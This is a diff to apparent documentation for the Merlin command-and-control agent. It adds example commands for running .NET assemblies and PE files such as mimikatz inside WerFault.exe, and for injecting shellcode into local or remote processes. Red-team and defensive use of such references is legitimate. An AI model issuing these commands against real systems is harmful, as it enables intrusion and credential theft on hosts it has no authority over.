@@ -445,6 +445,12 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
 ```
 
+##### Examples
+
+```c
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
+```
+
 #### Linux Specific Commands
 
 ```c
@@ -471,6 +477,23 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory
+```
+
+##### Examples
+
+```c
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY> <OPTION> "C:\\Windows\\System32\\WerFault.exe"
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe"
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe" <COMMENT>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self <SHELLCODE>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote <PID> <SHELLCODE>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode rtlcreateuserthread <PID> <SHELLCODE>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc <PID> <SHELLCODE>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /PATH/TO/BINARY/<BINARY>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY> <OPTION>
+Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr v4.0
 ```
 
 #### Example Usage
